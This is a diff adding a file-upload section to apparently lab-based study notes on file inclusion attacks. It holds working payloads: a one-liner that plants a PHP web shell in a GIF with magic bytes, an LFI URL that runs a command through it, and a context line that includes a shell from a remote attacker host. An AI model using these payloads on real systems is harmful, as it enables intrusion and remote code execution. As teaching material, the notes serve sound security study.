@@ -420,3 +420,33 @@ http://10.129.29.114/index.php?language=http://10.10.14.172:8001/shell.php&cmd=c
 ```
 
 ![Filtered output](images/basic-rfi.png)
+
+## File Uploads
+
+File upload functionality is a common feature in modern web applications. Being able to store files on the back-end server can be very beneficial for an attacker, as these files may later be leveraged through an LFI vulnerability.
+
+### Image Upload
+
+An attacker may create a malicious image file containing embedded PHP code. By including valid image **magic bytes** and using an allowed file extension, the file may bypass upload filters.
+
+**Example:**
+
+Embed a PHP web shell in a GIF file:
+
+```bash
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
+
+If the application later includes the uploaded file using a PHP include function, the embedded PHP code will be executed, resulting in remote code execution (RCE).
+
+To exploit this, the path to the uploaded file must be known. In many cases, the upload path can be inferred from the URL or by inspecting the page source.
+
+![Filtered output](images/file-path.png)
+
+With the path known, the file can be included via the LFI vulnerability and commands can be passed through the `cmd` parameter.
+
+**Example:**
+
+```bash
+http://94.237.55.43:48679/index.php?language=./profile_images/shell.gif&cmd=id
+```
